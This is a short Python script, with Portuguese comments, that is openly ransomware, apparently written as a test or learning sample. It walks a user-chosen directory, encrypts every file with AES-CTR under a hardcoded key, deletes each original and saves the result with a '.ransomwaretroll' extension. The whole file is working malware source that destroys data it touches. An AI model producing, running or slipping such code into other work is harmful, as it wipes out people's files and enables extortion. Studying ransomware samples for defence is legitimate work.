import os
import pyaes

# Função para criptografar um arquivo
def criptografar_arquivo(file_name, key):
    try:
        with open(file_name, "rb") as file:
            file_data = file.read()

        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        os.remove(file_name)
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo {file_name} criptografado com sucesso para {new_file_name}.")
    except Exception as e:
        print(f"Erro ao criptografar o arquivo {file_name}: {e}")

# Chave de criptografia
key = b"testeransomwares"

# Entrada do usuário
if __name__ == "__main__":
    diretorio_alvo = input("Digite o caminho do diretório a ser criptografado: ")
    for root, dirs, files in os.walk(diretorio_alvo):
        for file in files:
            file_path = os.path.join(root, file)
            criptografar_arquivo(file_path, key)

